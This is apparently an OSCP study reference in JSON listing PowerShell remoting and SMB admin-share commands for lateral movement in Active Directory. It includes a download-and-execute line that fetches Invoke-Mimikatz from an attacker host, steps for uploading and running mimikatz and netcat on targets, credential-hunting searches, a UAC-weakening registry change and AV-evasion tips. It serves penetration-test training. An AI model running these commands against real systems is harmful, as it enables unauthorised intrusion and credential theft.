{
  "metadata": {
    "category": "active-directory",
    "subcategory": "powershell-remoting",
    "description": "PowerShell remoting commands for lateral movement and remote administration",
    "author": "OSCP Reference",
    "version": "1.0",
    "last_updated": "2025-11-09"
  },
  "commands": [
    {
      "id": "enter-pssession",
      "name": "PowerShell Remote Interactive Session",
      "category": "post-exploit",
      "command": "Enter-PSSession -ComputerName <TARGET>",
      "description": "Establish interactive PowerShell session on remote computer via WinRM (requires local admin or WinRM permissions)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "POWERSHELL_REMOTING",
        "WINRM",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP address",
          "example": "FILESERVER01.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ComputerName": "Target system for remote session. Must have WinRM enabled (default on Server 2012+, manual on workstations).",
        "-Credential": "Specify alternate credentials: Enter-PSSession -ComputerName <TARGET> -Credential CORP\\admin"
      },
      "success_indicators": [
        "[TARGET]: PS C:\\Users\\username>",
        "Prompt changes to show remote computer name",
        "Commands execute on remote system"
      ],
      "failure_indicators": [
        "WinRM cannot process the request",
        "Access is denied",
        "Connecting to remote server failed",
        "The WinRM client cannot process the request"
      ],
      "next_steps": [
        "Enumerate system: whoami, hostname, systeminfo",
        "Search for credentials: dir C:\\Users\\*\\Desktop\\*.txt, findstr /SI password *.txt *.config",
        "Upload tools: Copy-Item -FromSession $session or via shares",
        "Exit session: Exit-PSSession"
      ],
      "alternatives": [
        "invoke-command",
        "psexec-lateral",
        "wmic-process-create"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "WinRM cannot process the request": "WinRM not enabled on target. Enable: Enable-PSRemoting -Force (requires local admin access)",
        "Access is denied": "User not in local Administrators group or Remote Management Users group. Verify access: Test-WSMan <TARGET>",
        "Connecting to remote server failed": "Firewall blocking port 5985 (HTTP) or 5986 (HTTPS). Test: Test-NetConnection <TARGET> -Port 5985",
        "TrustedHosts error": "Workgroup/IP-based connection requires TrustedHosts configuration: Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value <TARGET> -Force"
      },
      "notes": "PowerShell remoting uses WinRM (Windows Remote Management) over HTTP port 5985 or HTTPS port 5986.\n\nRequires:\n(1) Local admin on target OR membership in Remote Management Users group, (2) WinRM service enabled (default on Server 2012+, disabled on workstations pre-Windows 10), (3) Firewall allows TCP 5985/5986.\n\nAdvantages over PsExec:\nUses native Windows service (less suspicious), supports pass-the-hash via Invoke-Command, allows script execution remotely.\n\nSession is fully interactive - TAB completion works, can run multi-line scripts.\n\nOSCP:\nPreferred lateral movement method when available - cleaner than PsExec, less likely to trigger AV.\n\nTest WinRM availability with Test-WSMan <TARGET> before attempting connection.",
      "oscp_relevance": "high"
    },
    {
      "id": "invoke-command",
      "name": "PowerShell Remote Command Execution",
      "category": "post-exploit",
      "command": "Invoke-Command -ComputerName <TARGET> -ScriptBlock { <COMMAND> }",
      "description": "Execute PowerShell commands or script blocks on remote systems via WinRM without interactive session",
      "tags": [
        "ACTIVE_DIRECTORY",
        "POWERSHELL_REMOTING",
        "WINRM",
        "LATERAL_MOVEMENT",
        "COMMAND_EXECUTION",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname, IP, or comma-separated list of targets",
          "example": "WS01.corp.com,WS02.corp.com",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "PowerShell command or script block to execute remotely",
          "example": "whoami; hostname; ipconfig",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ComputerName": "Target system(s) for command execution. Accepts arrays for multi-host execution.",
        "-ScriptBlock": "PowerShell code to execute on remote system. Enclosed in curly braces {}.",
        "-Credential": "Alternate credentials: Invoke-Command -ComputerName <TARGET> -Credential (Get-Credential) -ScriptBlock {...}",
        "-FilePath": "Execute local script on remote system: Invoke-Command -ComputerName <TARGET> -FilePath C:\\Scripts\\script.ps1"
      },
      "success_indicators": [
        "Command output returned",
        "PSComputerName property shows source of output (for multi-host)",
        "No error messages"
      ],
      "failure_indicators": [
        "WinRM cannot process the request",
        "Access is denied",
        "Cannot validate argument on parameter 'ScriptBlock'"
      ],
      "next_steps": [
        "Run enumeration: Invoke-Command -ComputerName <TARGET> -ScriptBlock { Get-NetUser }",
        "Execute Mimikatz: Invoke-Command -ComputerName <TARGET> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz }",
        "Multi-host execution: Invoke-Command -ComputerName (Get-Content targets.txt) -ScriptBlock {...}"
      ],
      "alternatives": [
        "enter-pssession",
        "psexec-lateral",
        "wmic-process-create"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "WinRM cannot process the request": "WinRM not enabled. Enable with: Enable-PSRemoting -Force",
        "Access is denied": "Need local admin or Remote Management Users membership. Test: Test-WSMan <TARGET>",
        "ScriptBlock syntax error": "Ensure proper PowerShell syntax inside {}. Test locally first: Invoke-Command -ComputerName localhost -ScriptBlock {...}",
        "Authentication error": "Pass credentials explicitly: -Credential (Get-Credential)"
      },
      "notes": "Non-interactive alternative to Enter-PSSession.\n\nAdvantages:\n(1) Execute single commands without persistent session, (2) Run on multiple computers simultaneously (-ComputerName accepts arrays), (3) Return output to local console (vs interactive prompt).\n\nUse cases:\nQuick enumeration (whoami, ipconfig), download/execute scripts (IEX + DownloadString), mass credential dumping across multiple systems.\n\nSupports pass-the-hash when combined with Invoke-Mimikatz or Rubeus.\n\nScript execution:\nUse -FilePath to run local .ps1 files on remote systems (file is copied and executed).\n\nOSCP:\nUse for non-interactive command execution - faster than Enter-PSSession for single commands.\n\nCombine with PowerView for remote AD enumeration:\nInvoke-Command -ComputerName DC01 -ScriptBlock { Import-Module .\\PowerView.ps1; Get-NetUser }.",
      "oscp_relevance": "high"
    },
    {
      "id": "test-wsman-connectivity",
      "name": "Test WinRM Connectivity",
      "category": "enumeration",
      "command": "Test-WSMan -ComputerName <TARGET>",
      "description": "Verify WinRM service is accessible on remote system before attempting PowerShell remoting",
      "tags": [
        "ACTIVE_DIRECTORY",
        "WINRM",
        "ENUMERATION",
        "CONNECTIVITY",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "WS01.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ComputerName": "Target system to test WinRM connectivity against",
        "-Credential": "Test with alternate credentials: Test-WSMan -ComputerName <TARGET> -Credential CORP\\admin",
        "-Authentication": "Specify authentication method: -Authentication Negotiate (default), Kerberos, Basic"
      },
      "success_indicators": [
        "wsmid: http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd",
        "ProtocolVersion displayed (e.g., http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd)",
        "ProductVendor: Microsoft Corporation",
        "ProductVersion: OS: 0.0.0 SP: 0.0 Stack: 3.0"
      ],
      "failure_indicators": [
        "Test-WSMan : <f:WSManFault>",
        "WinRM cannot complete the operation",
        "The client cannot connect to the destination",
        "Access is denied"
      ],
      "next_steps": [
        "If success: Use Enter-PSSession or Invoke-Command for lateral movement",
        "If failure: Check WinRM service status, firewall rules, authentication method",
        "Alternative: Try PsExec, WMI, or DCOM lateral movement methods"
      ],
      "alternatives": [
        "test-netconnection-winrm"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "The client cannot connect": "WinRM service not running OR firewall blocking port 5985/5986. Check: Test-NetConnection <TARGET> -Port 5985",
        "Access is denied": "Authentication failure. Try with credentials: -Credential (Get-Credential). Check user is in Administrators or Remote Management Users group.",
        "WinRM cannot complete the operation": "WinRM service disabled. If you have admin access via other method (PsExec), enable: Enable-PSRemoting -Force"
      },
      "notes": "Test-WSMan sends WS-Management identification request to target.\n\nIf WinRM service is running and accessible, returns service identification XML.\n\nDoes NOT require authentication to succeed - even if you don't have access, you'll see service info (proves service is running).\n\nAccess denied error = service running but authentication failed (good - means WinRM available, just need valid credentials).\n\nConnection refused = service not running or firewall blocking.\n\nUse this before attempting Enter-PSSession to avoid wasting time on non-WinRM targets.\n\nOSCP:\nQuick check before lateral movement.\n\nIf Test-WSMan succeeds, PowerShell remoting is viable.\n\nIf fails, pivot to PsExec, WMI, or DCOM methods.",
      "oscp_relevance": "high"
    },
    {
      "id": "enable-psremoting",
      "name": "Enable PowerShell Remoting",
      "category": "post-exploit",
      "command": "Enable-PSRemoting -Force",
      "description": "Configure WinRM service and firewall rules to enable PowerShell remoting on local or remote system (requires local admin)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "POWERSHELL_REMOTING",
        "WINRM",
        "CONFIGURATION",
        "OSCP:MEDIUM"
      ],
      "variables": [],
      "flag_explanations": {
        "-Force": "Skip confirmation prompts - enables remoting silently",
        "-SkipNetworkProfileCheck": "Enable remoting even on Public network profiles (normally blocked for security)"
      },
      "success_indicators": [
        "WinRM is already set to receive requests on this computer",
        "WinRM has been updated to receive requests",
        "WinRM firewall exception enabled",
        "Test-WSMan localhost succeeds after enabling"
      ],
      "failure_indicators": [
        "Access is denied (need local admin)",
        "Unable to check the status of the firewall",
        "Network connection type is set to Public"
      ],
      "next_steps": [
        "Verify WinRM enabled: Test-WSMan",
        "Configure TrustedHosts if needed: Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force",
        "Test remote connectivity: Enter-PSSession -ComputerName <TARGET>"
      ],
      "alternatives": [
        "winrm-quickconfig"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access is denied": "Must be local admin. Run PowerShell as Administrator.",
        "Network connection type is set to Public": "Use -SkipNetworkProfileCheck flag OR change network profile: Set-NetConnectionProfile -NetworkCategory Private",
        "Unable to check firewall status": "Windows Firewall service disabled. Start: Start-Service mpssvc"
      },
      "notes": "Enable-PSRemoting performs multiple configuration steps:\n(1) Starts WinRM service, (2) Sets WinRM to auto-start, (3) Creates HTTP listener on port 5985, (4) Creates firewall exception for WinRM ports, (5) Enables LocalAccountTokenFilterPolicy (allows remote admin via local accounts).\n\nNormally run on the system you want to RECEIVE remote connections (not attacker machine).\n\nIf you compromise a system via other means (RDP, PsExec) and want to enable WinRM for future access, run this command.\n\nRequires local admin.\n\nOSCP scenario:\nYou get RDP access to workstation where WinRM is disabled.\n\nEnable it for cleaner future access:\nEnable-PSRemoting -Force -SkipNetworkProfileCheck.\n\nNow you can use Enter-PSSession instead of RDP (less network traffic, more stealthy).",
      "oscp_relevance": "medium"
    },
    {
      "id": "test-admin-share-access",
      "name": "Test Administrative Share Access",
      "category": "enumeration",
      "command": "Test-Path \\\\<TARGET>\\C$",
      "description": "Verify local administrator access on remote system by testing C$ administrative share accessibility",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SMB",
        "ADMIN_SHARES",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILESERVER01.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "Test-Path": "PowerShell cmdlet to test if path exists and is accessible",
        "\\\\\\\\<TARGET>\\\\C$": "Administrative share path. C$ = C: drive root (ADMIN$ = Windows directory, IPC$ = inter-process communication)"
      },
      "success_indicators": [
        "True (returned) - you have local admin access",
        "Can list contents: dir \\\\<TARGET>\\C$",
        "Can write files: echo test > \\\\<TARGET>\\C$\\temp\\test.txt"
      ],
      "failure_indicators": [
        "False (returned) - no local admin access",
        "Access is denied",
        "Logon failure: unknown user name or bad password",
        "The network path was not found"
      ],
      "next_steps": [
        "If True: Use lateral movement (PsExec, WinRM, WMI, DCOM)",
        "List admin shares: net view \\\\<TARGET>",
        "Browse C$: dir \\\\<TARGET>\\C$\\Users\\",
        "Upload tools: copy C:\\Tools\\mimikatz.exe \\\\<TARGET>\\C$\\Temp\\"
      ],
      "alternatives": [
        "net-use-admin-share",
        "dir-admin-share"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "False returned but no error": "SMB working but you lack admin rights. This is normal - not all users have admin everywhere.",
        "Network path not found": "Target offline, SMB disabled, or firewall blocking port 445. Test: Test-NetConnection <TARGET> -Port 445",
        "Access denied with valid admin": "UAC remote restrictions (Local Account Token Filter Policy). Workaround: Use domain admin account OR modify registry: reg add \\\\<TARGET>\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1"
      },
      "notes": "Administrative shares (C$, ADMIN$, IPC$) are created automatically by Windows and only accessible to local Administrators group.\n\nC$ provides access to C:\ndrive root, ADMIN$ maps to C:\\Windows, IPC$ used for named pipes.\n\nTesting C$ access = testing local admin membership.\n\nWhy this works:\nSMB authentication uses current user context.\n\nIf Test-Path returns True, your credentials have local admin on target.\n\nThis is fast pre-check before attempting lateral movement tools (PsExec, WinRM) which all require local admin.\n\nOSCP workflow:\n(1) Find-LocalAdminAccess to discover admin access across domain, (2) Test-Path \\\\<TARGET>\\C$ to verify specific target, (3) Execute lateral movement.\n\nAlternative syntax:\ndir \\\\<TARGET>\\C$ (if succeeds = admin, if access denied = not admin).",
      "oscp_relevance": "high"
    },
    {
      "id": "net-use-admin-share",
      "name": "Map Administrative Share with Credentials",
      "category": "post-exploit",
      "command": "net use \\\\<TARGET>\\C$ /user:<DOMAIN>\\<USERNAME> <PASSWORD>",
      "description": "Authenticate to administrative share with explicit credentials to test access or establish persistent connection",
      "tags": [
        "ACTIVE_DIRECTORY",
        "SMB",
        "ADMIN_SHARES",
        "AUTHENTICATION",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "WS01.corp.com",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name (use . for local accounts)",
          "example": "CORP",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password",
          "example": "P@ssw0rd123",
          "required": true
        }
      ],
      "flag_explanations": {
        "/user": "Specify credentials in DOMAIN\\USERNAME format",
        "/persistent:no": "Don't save connection (optional - prevents persistence across reboots)",
        "/delete": "Disconnect from share: net use \\\\<TARGET>\\C$ /delete"
      },
      "success_indicators": [
        "The command completed successfully",
        "Connection established",
        "Can list contents: dir \\\\<TARGET>\\C$"
      ],
      "failure_indicators": [
        "System error 5 has occurred. Access is denied.",
        "System error 1326 has occurred. The user name or password is incorrect.",
        "System error 53 has occurred. The network path was not found.",
        "Multiple connections to a server or shared resource by the same user... not allowed"
      ],
      "next_steps": [
        "Browse share: dir \\\\<TARGET>\\C$\\Users\\",
        "Upload files: copy C:\\Tools\\nc.exe \\\\<TARGET>\\C$\\Temp\\",
        "Execute commands: wmic /node:<TARGET> /user:<DOMAIN>\\<USERNAME> /password:<PASSWORD> process call create \"cmd.exe /c <COMMAND>\"",
        "Disconnect: net use \\\\<TARGET>\\C$ /delete"
      ],
      "alternatives": [
        "psexec-lateral",
        "smbclient-auth"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access denied": "Invalid credentials OR user not in local Administrators group. Verify: crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD>",
        "User name or password incorrect": "Check credentials. For local account, use: /user:.\\<USERNAME> (dot = local machine)",
        "Multiple connections error": "Existing connection to target. Disconnect first: net use \\\\<TARGET>\\C$ /delete OR net use * /delete /y (disconnect all)",
        "Network path not found": "SMB blocked or target offline. Check: Test-NetConnection <TARGET> -Port 445"
      },
      "notes": "net use establishes authenticated SMB session to administrative shares.\n\nUnlike Test-Path (uses current credentials), net use allows explicit credential specification.\n\nUse cases:\n(1) Test credentials against target, (2) Authenticate with compromised account, (3) Switch user context (if already connected as different user, disconnect first).\n\nConnection persists until reboot OR explicit disconnect (net use /delete).\n\nFor local accounts (SAM database, not AD), use syntax:\n/user:.\\<USERNAME> where dot represents local machine.\n\nOSCP:\nUse to test credential validity after cracking passwords or finding credentials in files.\n\nSuccessful net use = valid local admin credentials.\n\nFollow with PsExec, WMI, or manual file operations via C$ share.",
      "oscp_relevance": "high"
    },
    {
      "id": "dir-admin-share",
      "name": "List Administrative Share Contents",
      "category": "enumeration",
      "command": "dir \\\\<TARGET>\\<SHARE>",
      "description": "Browse contents of administrative shares (C$, ADMIN$) or regular file shares on remote system",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SMB",
        "SHARES",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILESERVER01",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "Share name (C$, ADMIN$, or custom share)",
          "example": "C$",
          "required": true
        }
      ],
      "flag_explanations": {
        "/s": "Recursive listing (subdirectories): dir \\\\<TARGET>\\<SHARE> /s",
        "/b": "Bare format (file names only, no details): dir \\\\<TARGET>\\<SHARE> /b",
        "/a": "Show all files including hidden/system: dir \\\\<TARGET>\\<SHARE> /a"
      },
      "success_indicators": [
        "Directory listing displayed",
        "Shows folders and files with sizes/dates",
        "Volume label and serial number shown"
      ],
      "failure_indicators": [
        "Access is denied",
        "Logon failure",
        "The network path was not found",
        "The system cannot find the file specified"
      ],
      "next_steps": [
        "Search for sensitive files: dir \\\\<TARGET>\\C$ /s /b | findstr /I password config backup",
        "Browse user directories: dir \\\\<TARGET>\\C$\\Users\\",
        "Download files: copy \\\\<TARGET>\\C$\\Users\\admin\\Desktop\\passwords.txt .",
        "Check for tools: dir \\\\<TARGET>\\C$\\Temp\\"
      ],
      "alternatives": [
        "test-path-admin-share",
        "smbclient-ls"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access is denied": "No permissions on share. For admin shares, need local admin. For regular shares, need Read permissions.",
        "Network path not found": "Invalid share name. List shares: net view \\\\<TARGET>",
        "System cannot find file specified": "Typo in path OR share doesn't exist. Common admin shares: C$, D$, ADMIN$ (Windows dir), IPC$ (named pipes)"
      },
      "notes": "Simple file browsing via SMB.\n\nAdministrative shares (C$, ADMIN$) require local admin.\n\nRegular shares require explicit permissions.\n\nCommon reconnaissance patterns:\n(1) dir \\\\<TARGET>\\C$\\Users\\ - list user profiles (identify user accounts), (2) dir \\\\<TARGET>\\C$\\Users\\*\\Desktop\\ /s - find files on all user desktops, (3) dir \\\\<TARGET>\\C$\\inetpub\\wwwroot\\ - web server files (web.config credentials), (4) dir \\\\<TARGET>\\ADMIN$\\System32\\ - verify Windows directory access.\n\nUse /s for recursive search, /b for clean file lists (pipe to findstr).\n\nOSCP:\nAfter confirming admin access (Test-Path), use dir to enumerate sensitive locations.\n\nLook for:\ncredentials in Desktop/Documents, application configs in C:\\inetpub or C:\\Program Files, backup files in C:\\Temp or C:\\Backup.",
      "oscp_relevance": "high"
    },
    {
      "id": "copy-file-admin-share",
      "name": "Copy File via Administrative Share",
      "category": "file-transfer",
      "command": "copy <LOCAL_FILE> \\\\<TARGET>\\C$\\<REMOTE_PATH>",
      "description": "Upload files to remote system via administrative share (C$, ADMIN$) - common for tool deployment and payload staging",
      "tags": [
        "ACTIVE_DIRECTORY",
        "FILE_TRANSFER",
        "SMB",
        "ADMIN_SHARES",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<LOCAL_FILE>",
          "description": "Local file path to upload",
          "example": "C:\\Tools\\mimikatz.exe",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILESERVER01",
          "required": true
        },
        {
          "name": "<REMOTE_PATH>",
          "description": "Destination path on remote system (relative to share)",
          "example": "Temp\\mimikatz.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "/Y": "Suppress confirmation prompt for overwriting files: copy /Y <LOCAL> \\\\<TARGET>\\C$\\<REMOTE>"
      },
      "success_indicators": [
        "1 file(s) copied",
        "File transferred successfully",
        "Verify with: dir \\\\<TARGET>\\C$\\<REMOTE_PATH>"
      ],
      "failure_indicators": [
        "Access is denied",
        "The system cannot find the path specified",
        "Not enough space on disk",
        "The network path was not found"
      ],
      "next_steps": [
        "Verify upload: dir \\\\<TARGET>\\C$\\<REMOTE_PATH>",
        "Execute uploaded file: PsExec.exe \\\\<TARGET> C:\\<REMOTE_PATH>",
        "Alternative execution: wmic /node:<TARGET> process call create \"C:\\<REMOTE_PATH>\"",
        "Download files: copy \\\\<TARGET>\\C$\\<REMOTE_PATH> <LOCAL_DESTINATION>"
      ],
      "alternatives": [
        "smbclient-put",
        "powershell-copy-item",
        "xcopy-admin-share"
      ],
      "prerequisites": [
        "test-admin-share-access"
      ],
      "troubleshooting": {
        "Access denied": "Need local admin for C$ write access. Test: Test-Path \\\\<TARGET>\\C$",
        "Path not found": "Remote directory doesn't exist. Create first: (PowerShell) New-Item -Path \\\\<TARGET>\\C$\\Temp -ItemType Directory OR use existing path like C$\\Windows\\Temp",
        "Not enough space": "Target disk full. Check: wmic /node:<TARGET> logicaldisk get size,freespace",
        "Network path not found": "SMB blocked or target offline"
      },
      "notes": "Administrative share file transfer is core lateral movement technique.\n\nCommon pattern:\n(1) Verify admin access (Test-Path \\\\<TARGET>\\C$), (2) Upload tool (copy mimikatz.exe \\\\<TARGET>\\C$\\Temp\\), (3) Execute (PsExec/WMI), (4) Retrieve output/cleanup.\n\nWrite locations:\nC$\\Temp (C:\\Temp - usually writable), C$\\Windows\\Temp (C:\\Windows\\Temp - system temp), C$\\Users\\Public (C:\\Users\\Public - world-writable).\n\nAvoid C$\\ root (too obvious) or C$\\Windows\\System32 (protected).\n\nOSCP:\nThis is how you deploy Mimikatz, reverse shells, and enumeration tools to remote systems.\n\nAfter copy, use PsExec or WMI to execute.\n\nDon't forget cleanup:\ndel \\\\<TARGET>\\C$\\Temp\\mimikatz.exe after use.",
      "oscp_relevance": "high"
    }
  ]
}